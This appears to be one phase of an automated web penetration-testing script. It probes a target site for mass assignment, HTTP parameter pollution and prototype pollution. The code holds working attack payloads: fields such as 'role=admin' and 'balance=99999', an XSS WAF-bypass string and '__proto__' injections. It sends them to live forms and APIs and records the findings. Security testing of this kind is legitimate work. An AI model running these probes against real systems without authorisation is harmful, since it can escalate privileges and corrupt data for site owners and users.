**Phase 28 — Mass Assignment / HTTP Parameter Pollution**

  Tests for mass assignment vulnerabilities (extra parameter injection in APIs/forms),
  HTTP parameter pollution (duplicate/conflicting parameters), and prototype pollution
  (Node.js __proto__ injection). All state-changing endpoints are probed for unvalidated fields.

  ```python
  import time, json, re, copy
  from urllib.parse import urljoin, urlparse, urlencode, parse_qs

  BASE       = _G['BASE']
  SESSION_DIR = _G['SESSION_DIR']
  session    = _G.get('session_a') or _G.get('session')
  ALL_FORMS  = _G.get('ALL_FORMS', []) + _G.get('AUTH_FORMS', [])
  ALL_LINKS  = _G.get('ALL_LINKS', set())
  AUTH_PAGES = _G.get('AUTH_PAGES', {})

  mass_findings = []

  print('='*60)
  print('PHASE 28 — MASS ASSIGNMENT / HTTP PARAMETER POLLUTION')
  print('='*60)

  # ══════════════════════════════════════════════════════════════
  # PART A — Mass Assignment on Forms (registration, profile, settings)
  # ══════════════════════════════════════════════════════════════
  MA_TARGET_KEYWORDS = ['register', 'signup', 'sign-up', 'profile', 'settings',
                        'account', 'update', 'edit', 'create', 'user', 'preferences']
  PRIV_FIELDS = [
      ('role', 'admin'),
      ('is_admin', 'true'),
      ('admin', '1'),
      ('isAdmin', 'true'),
      ('user_type', 'admin'),
      ('group', 'administrators'),
      ('verified', 'true'),
      ('email_verified', 'true'),
      ('active', 'true'),
      ('is_active', 'true'),
      ('approved', 'true'),
      ('balance', '99999'),
      ('credits', '99999'),
      ('discount', '100'),
      ('user_id', '1'),
      ('account_id', '1'),
      ('created_at', '2000-01-01'),
      ('updated_at', '2000-01-01'),
      ('permissions', 'all'),
      ('level', '99'),
  ]

  # Identify target forms
  ma_forms = []
  for form in ALL_FORMS:
      action_str = (form.get('action', '') + ' '.join(
          f.get('name', '') for f in form.get('fields', [])
      )).lower()
      if any(k in action_str for k in MA_TARGET_KEYWORDS):
          ma_forms.append(form)

  if ma_forms:
      print(f"[MA] Found {len(ma_forms)} candidate forms for mass assignment testing")
      for form in ma_forms[:8]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          method = form.get('method', 'POST').upper()
          fields = form.get('fields', [])
          existing_names = {f.get('name', '').lower() for f in fields if f.get('name')}

          # Build baseline data
          base_data = {}
          for f in fields:
              name = f.get('name')
              if not name:
                  continue
              val = f.get('value', '') or 'test'
              base_data[name] = val

          # Send baseline request
          try:
              if method == 'POST':
                  baseline_r = session.post(url, data=base_data, timeout=10, allow_redirects=True)
              else:
                  baseline_r = session.get(url, params=base_data, timeout=10, allow_redirects=True)
              baseline_status = baseline_r.status_code
              baseline_len = len(baseline_r.text)
          except Exception as e:
              print(f"  [SKIP] Baseline failed for {url}: {e}")
              continue

          # Test each privileged field
          for priv_name, priv_value in PRIV_FIELDS:
              if priv_name.lower() in existing_names:
                  continue  # Already a legitimate field
              test_data = copy.copy(base_data)
              test_data[priv_name] = priv_value

              try:
                  if method == 'POST':
                      r = session.post(url, data=test_data, timeout=10, allow_redirects=True)
                  else:
                      r = session.get(url, params=test_data, timeout=10, allow_redirects=True)

                  # Check for acceptance indicators
                  accepted = False
                  # Field value reflected in response
                  if priv_value in r.text and priv_value not in baseline_r.text:
                      accepted = True
                  # Response differs significantly (field was processed)
                  if r.status_code == baseline_status and abs(len(r.text) - baseline_len) > 50:
                      # Could be accepted — needs verification
                      if priv_name in r.text.lower():
                          accepted = True
                  # No validation error for extra field (200/201/302 vs 400/422)
                  if r.status_code in (200, 201, 302) and baseline_status in (200, 201, 302):
                      # Check JSON responses for the field
                      try:
                          rj = r.json()
                          if priv_name in rj or priv_name in str(rj).lower():
                              accepted = True
                      except:
                          pass

                  if accepted:
                      print(f"  [HIGH] Mass assignment: {url} accepted '{priv_name}={priv_value}'")
                      mass_findings.append({
                          'url': url, 'type': 'mass-assignment',
                          'field': priv_name, 'value': priv_value,
                          'desc': f"Server accepted extra field '{priv_name}={priv_value}' in {method} to {url}",
                      })
                      break  # One confirmed field per form is enough
              except:
                  continue
  else:
      print("[MA] No registration/profile/settings forms found for mass assignment testing")

  # ══════════════════════════════════════════════════════════════
  # PART A2 — Mass Assignment on JSON API Endpoints
  # ══════════════════════════════════════════════════════════════
  api_endpoints = [p for p in ALL_LINKS if '/api/' in p]
  json_forms = [f for f in ALL_FORMS if '/api/' in f.get('action', '')]

  # Collect API URLs that accept POST/PUT/PATCH
  api_urls = set()
  for ep in api_endpoints:
      base_ep = ep.split('?')[0]
      if any(k in base_ep.lower() for k in ['user', 'profile', 'account', 'settings', 'register', 'signup']):
          api_urls.add(base_ep)
  for f in json_forms:
      api_urls.add(f.get('action', ''))

  if api_urls:
      print(f"\n[MA] Testing {len(api_urls)} JSON API endpoints for mass assignment")
      for api_url in list(api_urls)[:10]:
          url = api_url if api_url.startswith('http') else urljoin(BASE, api_url)
          headers = {'Content-Type': 'application/json'}

          # Try GET first to see the current object shape
          try:
              r_get = session.get(url, timeout=10, headers=headers)
              try:
                  obj = r_get.json()
              except:
                  obj = {}
          except:
              obj = {}

          # Inject privileged fields into JSON body
          json_payloads = [
              {"role": "admin"},
              {"is_admin": True, "isAdmin": True},
              {"verified": True, "email_verified": True},
              {"balance": 99999, "credits": 99999},
              {"user_id": 1, "account_id": 1},
              {"permissions": ["admin", "write", "delete"]},
              {"level": 99, "discount": 100},
          ]

          for payload in json_payloads:
              # Merge with existing object if we got one
              test_body = {**obj, **payload} if isinstance(obj, dict) else payload
              try:
                  for method in ['PUT', 'PATCH', 'POST']:
                      r = session.request(method, url, json=test_body, timeout=10, headers=headers)
                      if r.status_code in (200, 201, 204):
                          try:
                              rj = r.json()
                              for k, v in payload.items():
                                  if k in str(rj):
                                      print(f"  [HIGH] Mass assignment (JSON): {url} accepted '{k}' via {method}")
                                      mass_findings.append({
                                          'url': url, 'type': 'mass-assignment-json',
                                          'field': k, 'value': str(v),
                                          'desc': f"JSON API accepted privileged field '{k}' via {method} {url}",
                                      })
                                      break
                          except:
                              pass
                          break  # Stop trying methods if one works
              except:
                  continue
  else:
      print("[MA] No API endpoints found for JSON mass assignment testing")

  # ══════════════════════════════════════════════════════════════
  # PART B — HTTP Parameter Pollution (HPP)
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print("PART B — HTTP PARAMETER POLLUTION")
  print('='*60)

  # Collect endpoints with query parameters
  parameterized_urls = [u for u in ALL_LINKS if '?' in u]

  hpp_findings = []
  tested_params = set()

  if parameterized_urls:
      print(f"[HPP] Testing {len(parameterized_urls)} URLs with query parameters")
      for purl in parameterized_urls[:15]:
          parsed = urlparse(purl)
          params = parse_qs(parsed.query)
          base_url = purl.split('?')[0]

          for param_name, param_vals in params.items():
              key = f"{base_url}:{param_name}"
              if key in tested_params:
                  continue
              tested_params.add(key)

              orig_val = param_vals[0] if param_vals else 'test'

              # Test 1: Duplicate parameter in GET (server-side HPP)
              # ?id=1&id=2 — which value does the server use?
              hpp_url = f"{base_url}?{param_name}={orig_val}&{param_name}=HPPTEST"
              try:
                  r = session.get(hpp_url, timeout=10, allow_redirects=True)
                  if 'HPPTEST' in r.text:
                      print(f"  [MEDIUM] HPP: {base_url} uses LAST duplicate param '{param_name}'")
                      hpp_findings.append({
                          'url': base_url, 'type': 'hpp-last-wins',
                          'param': param_name,
                          'desc': f"Server uses last value for duplicate param '{param_name}'",
                      })
                  elif orig_val in r.text and 'HPPTEST' not in r.text:
                      # Server uses first — try to bypass filters
                      pass
              except:
                  continue

              # Test 2: Mixed GET + POST with same parameter
              try:
                  mixed_url = f"{base_url}?{param_name}={orig_val}"
                  r_mixed = session.post(mixed_url, data={param_name: 'HPPMIXED'},
                                         timeout=10, allow_redirects=True)
                  if 'HPPMIXED' in r_mixed.text and orig_val not in r_mixed.text:
                      print(f"  [MEDIUM] HPP: POST body overrides GET param '{param_name}' at {base_url}")
                      hpp_findings.append({
                          'url': base_url, 'type': 'hpp-mixed-get-post',
                          'param': param_name,
                          'desc': f"POST body overrides GET query for '{param_name}'",
                      })
              except:
                  continue

              # Test 3: Array notation pollution
              for notation in [f'{param_name}[]', f'{param_name}[0]']:
                  try:
                      arr_url = f"{base_url}?{notation}={orig_val}&{notation}=HPPARR"
                      r_arr = session.get(arr_url, timeout=10, allow_redirects=True)
                      if 'HPPARR' in r_arr.text:
                          print(f"  [LOW] HPP: Array notation accepted for '{param_name}' at {base_url}")
                          hpp_findings.append({
                              'url': base_url, 'type': 'hpp-array',
                              'param': param_name,
                              'desc': f"Array notation '{notation}' accepted and reflected",
                          })
                          break
                  except:
                      continue

      # Test 4: HPP for filter/search bypass
      search_urls = [u for u in parameterized_urls
                     if any(k in u.lower() for k in ['search', 'filter', 'sort', 'order', 'q=', 'query'])]
      for surl in search_urls[:5]:
          parsed = urlparse(surl)
          params = parse_qs(parsed.query)
          base_url = surl.split('?')[0]
          for pname in params:
              # Inject SQL/XSS via duplicate param to bypass WAF
              bypass_url = f"{base_url}?{pname}=safe&{pname}=<script>alert(1)</script>"
              try:
                  r = session.get(bypass_url, timeout=10, allow_redirects=True)
                  if '<script>alert(1)</script>' in r.text:
                      print(f"  [HIGH] HPP WAF bypass: XSS via duplicate '{pname}' at {base_url}")
                      hpp_findings.append({
                          'url': base_url, 'type': 'hpp-waf-bypass',
                          'param': pname,
                          'desc': f"WAF bypass via duplicate param — XSS payload reflected",
                      })
              except:
                  continue
  else:
      print("[HPP] No parameterized URLs found")

  mass_findings.extend(hpp_findings)

  # ══════════════════════════════════════════════════════════════
  # PART C — Prototype Pollution (Node.js / JS backends)
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print("PART C — PROTOTYPE POLLUTION")
  print('='*60)

  # Detect Node.js backend
  nodejs_detected = False
  try:
      r_check = session.get(BASE, timeout=10)
      server_header = r_check.headers.get('X-Powered-By', '').lower()
      via_header = r_check.headers.get('Via', '').lower()
      if 'express' in server_header or 'node' in server_header or 'koa' in server_header:
          nodejs_detected = True
          print(f"[PP] Node.js backend detected via X-Powered-By: {server_header}")
      # Also check error pages
      r_err = session.get(urljoin(BASE, '/nonexistent_' + str(int(time.time()))), timeout=10)
      if any(k in r_err.text.lower() for k in ['cannot get', 'express', 'node', 'unexpected token']):
          nodejs_detected = True
          print("[PP] Node.js backend detected via error page signatures")
  except:
      pass

  proto_findings = []

  # Test JSON merge endpoints regardless (many frameworks are vulnerable)
  json_endpoints = list(api_urls) if api_urls else []
  # Also find endpoints that accept JSON
  for form in ALL_FORMS:
      action = form.get('action', '')
      if action and form.get('method', '').upper() in ('POST', 'PUT', 'PATCH'):
          full = action if action.startswith('http') else urljoin(BASE, action)
          json_endpoints.append(full)

  json_endpoints = list(set(json_endpoints))

  if json_endpoints:
      print(f"[PP] Testing {len(json_endpoints)} endpoints for prototype pollution")

      PROTO_PAYLOADS = [
          {"__proto__": {"isAdmin": True, "polluted": "PROTO_POLLUTED"}},
          {"constructor": {"prototype": {"isAdmin": True, "polluted": "PROTO_POLLUTED"}}},
          {"__proto__": {"role": "admin", "status": 200}},
          {"__proto__": {"toString": "PROTO_POLLUTED"}},
      ]

      for ep in json_endpoints[:10]:
          url = ep if ep.startswith('http') else urljoin(BASE, ep)
          headers = {'Content-Type': 'application/json'}

          for payload in PROTO_PAYLOADS:
              try:
                  for method in ['POST', 'PUT', 'PATCH']:
                      r = session.request(method, url, json=payload, timeout=10, headers=headers)
                      resp_text = r.text.lower()

                      # Check if pollution indicator is reflected
                      if 'proto_polluted' in resp_text or '"isadmin": true' in resp_text \
                         or '"isadmin":true' in resp_text:
                          print(f"  [CRITICAL] Prototype pollution: {url} accepted __proto__ via {method}")
                          proto_findings.append({
                              'url': url, 'type': 'prototype-pollution',
                              'payload': json.dumps(payload),
                              'desc': f"Server accepted and reflected __proto__ payload via {method}",
                          })
                          break

                      # Check if pollution persists (global pollution)
                      if r.status_code in (200, 201, 204):
                          # Fetch a clean endpoint and check for pollution
                          try:
                              r_verify = session.get(BASE, timeout=10)
                              if 'proto_polluted' in r_verify.text.lower():
                                  print(f"  [CRITICAL] Global prototype pollution from {url}!")
                                  proto_findings.append({
                                      'url': url, 'type': 'global-prototype-pollution',
                                      'payload': json.dumps(payload),
                                      'desc': f"Global prototype pollution — __proto__ injection persisted across requests",
                                  })
                                  break
                          except:
                              pass
                  else:
                      continue
                  break  # Stop testing this endpoint after finding
              except:
                  continue

      # Query parameter prototype pollution
      print("[PP] Testing query parameter prototype pollution")
      proto_qs_payloads = [
          '__proto__[isAdmin]=true',
          '__proto__[role]=admin',
          'constructor[prototype][isAdmin]=true',
          '__proto__.isAdmin=true',
      ]
      for ep in json_endpoints[:5]:
          url = ep if ep.startswith('http') else urljoin(BASE, ep)
          for qs_payload in proto_qs_payloads:
              try:
                  test_url = f"{url}?{qs_payload}"
                  r = session.get(test_url, timeout=10)
                  if 'isadmin' in r.text.lower() and 'true' in r.text.lower():
                      print(f"  [HIGH] Query param prototype pollution: {test_url}")
                      proto_findings.append({
                          'url': test_url, 'type': 'query-prototype-pollution',
                          'payload': qs_payload,
                          'desc': f"Prototype pollution via query string: {qs_payload}",
                      })
                      break
              except:
                  continue
  else:
      print("[PP] No JSON endpoints found for prototype pollution testing")

  mass_findings.extend(proto_findings)

  # ══════════════════════════════════════════════════════════════
  # SUMMARY
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print(f"PHASE 28 SUMMARY: {len(mass_findings)} issues found")
  print('='*60)

  for f in mass_findings:
      if f['type'] in ('global-prototype-pollution',):
          sev = 'CRITICAL'
      elif f['type'] in ('mass-assignment', 'mass-assignment-json', 'prototype-pollution'):
          sev = 'HIGH'
      elif f['type'] in ('hpp-waf-bypass', 'query-prototype-pollution'):
          sev = 'HIGH'
      elif f['type'] in ('hpp-last-wins', 'hpp-mixed-get-post'):
          sev = 'MEDIUM'
      else:
          sev = 'LOW'
      print(f"  [{sev}] {f['type']}: {f.get('url','')} — {f.get('desc','')}")

  if mass_findings:
      for f in mass_findings:
          if f['type'] in ('global-prototype-pollution',):
              sev = 'CRITICAL'
          elif f['type'] in ('mass-assignment', 'mass-assignment-json', 'prototype-pollution'):
              sev = 'HIGH'
          elif f['type'] in ('hpp-waf-bypass', 'query-prototype-pollution'):
              sev = 'HIGH'
          elif f['type'] in ('hpp-last-wins', 'hpp-mixed-get-post'):
              sev = 'MEDIUM'
          else:
              sev = 'LOW'

          title_map = {
              'mass-assignment': 'Mass Assignment',
              'mass-assignment-json': 'Mass Assignment',
              'hpp-last-wins': 'Parameter Pollution',
              'hpp-mixed-get-post': 'Parameter Pollution',
              'hpp-array': 'Parameter Pollution',
              'hpp-waf-bypass': 'HPP WAF Bypass',
              'prototype-pollution': 'Prototype Pollution',
              'global-prototype-pollution': 'Prototype Pollution',
              'query-prototype-pollution': 'Prototype Pollution',
          }

          _G.setdefault('FINDINGS', []).append({
              'severity': sev,
              'title': title_map.get(f['type'], 'Mass Assignment'),
              'url': f.get('url', ''),
              'method': 'POST',
              'evidence': f.get('desc', ''),
              'impact': {
                  'mass-assignment': 'Privilege escalation, unauthorized data modification, account takeover',
                  'mass-assignment-json': 'Privilege escalation, unauthorized data modification, account takeover',
                  'hpp-last-wins': 'Filter bypass, logic manipulation, WAF evasion',
                  'hpp-mixed-get-post': 'Filter bypass, logic manipulation, WAF evasion',
                  'hpp-array': 'Unexpected server behavior, potential injection vector',
                  'hpp-waf-bypass': 'WAF bypass leading to XSS/SQLi, full security control evasion',
                  'prototype-pollution': 'Remote code execution, privilege escalation, denial of service',
                  'global-prototype-pollution': 'Remote code execution, privilege escalation, denial of service',
                  'query-prototype-pollution': 'Privilege escalation, authentication bypass',
              }.get(f['type'], 'Unauthorized access or data manipulation'),
              'screenshot': '',
              'detail': f,
          })

  # POST-PHASE SCREENSHOT CHECKPOINT
  print("\n[SCREENSHOT CHECKPOINT] Verify mass assignment / HPP / prototype pollution findings:")
  for finding in _G.get('FINDINGS', []):
      if finding.get('title') in ('Mass Assignment', 'Parameter Pollution', 'HPP WAF Bypass', 'Prototype Pollution'):
          if not finding.get('screenshot'):
              safe_name = re.sub(r'[^\w]', '_', finding.get('title', ''))[:30].lower()
              print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
              print(f"    URL: {finding.get('url')}")
              print(f"    browser_action(action='screenshot', filename='phase_28_{safe_name}.png')")
  ```
